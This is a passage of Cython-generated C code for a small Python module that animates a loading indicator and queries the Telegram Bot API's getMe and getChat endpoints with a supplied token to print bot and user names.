          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_5, __pyx_float_0_1) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_float_0_1);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 122, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
    }
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_sys); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_7, __pyx_kp_u_L_C) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_u_L_C);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("source.loading_animation", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_loading_chars);
  __Pyx_XDECREF(__pyx_v_char);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3get_bot_info(PyObject *__pyx_self, PyObject *__pyx_v_token); /*proto*/
static PyMethodDef __pyx_mdef_6source_3get_bot_info = {"get_bot_info", (PyCFunction)__pyx_pw_6source_3get_bot_info, METH_O, 0};
static PyObject *__pyx_pw_6source_3get_bot_info(PyObject *__pyx_self, PyObject *__pyx_v_token) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("get_bot_info (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_2get_bot_info(__pyx_self, ((PyObject *)__pyx_v_token));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_2get_bot_info(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_token) {
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_first_name = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  Py_ssize_t __pyx_t_2;
  Py_UCS4 __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("get_bot_info", 0);

  
  __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 130, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = 0;
  __pyx_t_3 = 127;
  __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
  __pyx_t_2 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_https_api_telegram_org_bot);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_token, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 130, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_getMe);
  __pyx_t_2 += 6;
  __Pyx_GIVEREF(__pyx_kp_u_getMe);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_getMe);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 130, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_url = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 133, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 133, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_1, __pyx_v_url) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_url);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 133, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_v_response = __pyx_t_4;
  __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_status_code); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 135, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyInt_EqObjC(__pyx_t_4, __pyx_int_200, 0xC8, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 135, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 135, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (__pyx_t_6) {

    
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 136, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_1)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_1);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_5 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 136, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_v_data = __pyx_t_5;
    __pyx_t_5 = 0;

    
    __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_data, __pyx_n_u_ok); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 137, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 137, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (__pyx_t_6) {

      
      __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_data, __pyx_n_u_result); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 138, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_u_first_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 138, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_first_name = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_data, __pyx_n_u_result); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 139, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_username); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 139, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_username = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __pyx_t_5 = PyTuple_New(9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 141, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_2 = 0;
      __pyx_t_3 = 127;
      __Pyx_INCREF(__pyx_kp_u__5);
      __pyx_t_2 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__5);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u__5);
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_G6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 141, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 141, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
      __Pyx_GIVEREF(__pyx_t_1);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_1);
      __pyx_t_1 = 0;
      __Pyx_INCREF(__pyx_kp_u__6);
      __pyx_t_3 = (1114111 > __pyx_t_3) ? 1114111 : __pyx_t_3;
      __pyx_t_2 += 13;
      __Pyx_GIVEREF(__pyx_kp_u__6);
      PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u__6);
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_B6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 141, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 141, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u_B_N);
      __pyx_t_3 = (65535 > __pyx_t_3) ? 65535 : __pyx_t_3;
      __pyx_t_2 += 17;
      __Pyx_GIVEREF(__pyx_kp_u_B_N);
      PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_kp_u_B_N);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_first_name, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 141, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_5, 5, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u_B_Us);
      __pyx_t_3 = (65535 > __pyx_t_3) ? 65535 : __pyx_t_3;
      __pyx_t_2 += 22;
      __Pyx_GIVEREF(__pyx_kp_u_B_Us);
      PyTuple_SET_ITEM(__pyx_t_5, 6, __pyx_kp_u_B_Us);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 141, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_5, 7, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u__5);
      __pyx_t_2 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__5);
      PyTuple_SET_ITEM(__pyx_t_5, 8, __pyx_kp_u__5);
      __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 9, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 141, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 140, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
      goto __pyx_L4;
    }

    
    /*else*/ {
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__7, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 143, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    __pyx_L4:;

    
    goto __pyx_L3;
  }

  
  /*else*/ {

    
    __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 146, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_2 = 0;
    __pyx_t_3 = 127;
    __Pyx_INCREF(__pyx_kp_u__8);
    __pyx_t_2 += 2;
    __Pyx_GIVEREF(__pyx_kp_u__8);
    PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u__8);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_red6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 146, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 146, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_3;
    __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_INCREF(__pyx_kp_u_E_B_T_Ws_W_Ps_C_Y_B_T);
    __pyx_t_3 = (1114111 > __pyx_t_3) ? 1114111 : __pyx_t_3;
    __pyx_t_2 += 64;
    __Pyx_GIVEREF(__pyx_kp_u_E_B_T_Ws_W_Ps_C_Y_B_T);
    PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_E_B_T_Ws_W_Ps_C_Y_B_T);
    __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 146, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 145, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  }
  __pyx_L3:;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("source.get_bot_info", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_first_name);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5get_user_info(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_5get_user_info = {"get_user_info", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_5get_user_info, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_6source_5get_user_info(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_token = 0;
  PyObject *__pyx_v_user_id = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("get_user_info (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_token,&__pyx_n_s_user_id,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_token)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_user_id)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("get_user_info", 1, 2, 2, 1); __PYX_ERR(0, 151, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "get_user_info") < 0)) __PYX_ERR(0, 151, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_token = values[0];
    __pyx_v_user_id = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("get_user_info", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 151, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("source.get_user_info", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_6source_4get_user_info(__pyx_self, __pyx_v_token, __pyx_v_user_id);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_4get_user_info(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_token, PyObject *__pyx_v_user_id) {
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_params = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_user_info = NULL;
  PyObject *__pyx_v_first_name = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  Py_ssize_t __pyx_t_2;
  Py_UCS4 __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("get_user_info", 0);

  
  __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = 0;
  __pyx_t_3 = 127;
  __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
  __pyx_t_2 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_https_api_telegram_org_bot);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_token, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_getChat);
  __pyx_t_2 += 8;
  __Pyx_GIVEREF(__pyx_kp_u_getChat);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_getChat);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_url = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_chat_id, __pyx_v_user_id) < 0) __PYX_ERR(0, 153, __pyx_L1_error)
  __pyx_v_params = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 156, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 156, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 156, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_v_url);
  __Pyx_GIVEREF(__pyx_v_url);
  PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_url);
  __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 156, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 156, __pyx_L1_error)
  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 156, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_v_response = __pyx_t_6;
  __pyx_t_6 = 0;

  
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_status_code); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 158, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = __Pyx_PyInt_EqObjC(__pyx_t_6, __pyx_int_200, 0xC8, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 158, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 158, __pyx_L1_error)
